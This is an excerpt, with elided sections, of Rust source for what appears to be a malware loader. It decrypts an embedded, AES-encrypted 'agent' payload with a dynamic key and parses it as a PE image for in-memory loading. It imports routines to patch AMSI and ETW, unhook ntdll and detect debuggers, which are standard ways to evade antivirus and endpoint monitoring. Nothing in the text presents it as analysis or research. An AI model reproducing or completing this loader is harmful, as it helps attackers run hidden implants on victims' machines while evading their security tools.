...
use runtime_loader_rust::{
    comprehensive_debug_check, crypto::get_decryption_key, data::ENCRYPTED_AGENT, log, patch_amsi,
    patch_etw, unhook_ntdll, ManualMapper, PELoader,
};
...
fn main() -> Result<(), Box<dyn Error>> {
    ...
    log!(
        "[DEBUG] ENCRYPTED_AGENT size: {} bytes",
        ENCRYPTED_AGENT.len()
    );
    ...
    log!(
        "[+] Embedded encrypted payload size: {} bytes",
        encrypted.len()
    );
    log!("[+] Dynamic AES key size: {} bytes", key.len());

    // ИСПРАВЛЕНО: Используем динамический ключ
    let decrypted = match std::panic::catch_unwind(|| decrypt_aes_ecb(encrypted, &key)) {
        Ok(data) => {
    ...
    match PELoader::new(&decrypted) {
        Ok(pe_loader) => {
            ...
            log!(
                "[DEBUG] PE entry point: 0x{:X}",
                pe_loader.get_entry_point()
            );
            log!(
                "[DEBUG] PE image size: {} bytes",
                pe_loader.get_image_size()
            );
